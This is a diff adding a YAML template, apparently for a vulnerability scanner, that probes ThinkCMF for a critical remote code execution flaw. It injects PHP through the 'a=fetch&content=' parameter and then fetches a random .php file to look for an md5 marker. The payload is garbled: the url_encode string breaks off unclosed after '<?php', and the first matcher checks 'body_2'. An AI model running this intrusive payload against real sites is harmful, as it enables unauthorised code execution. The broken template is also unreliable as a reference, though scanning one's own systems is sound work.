@@ -1,0 +1,29 @@
+id: thinkcmf-rce
+brief:
+    title: ThinkCMF - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: ThinkCMF  is susceptible to a remote code execution vulnerability.
+    label:
+        - thinkcmf
+        - rce
+        - intrusive
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?a=fetch&content={{url_encode(''<?php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{randstr}}.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_2
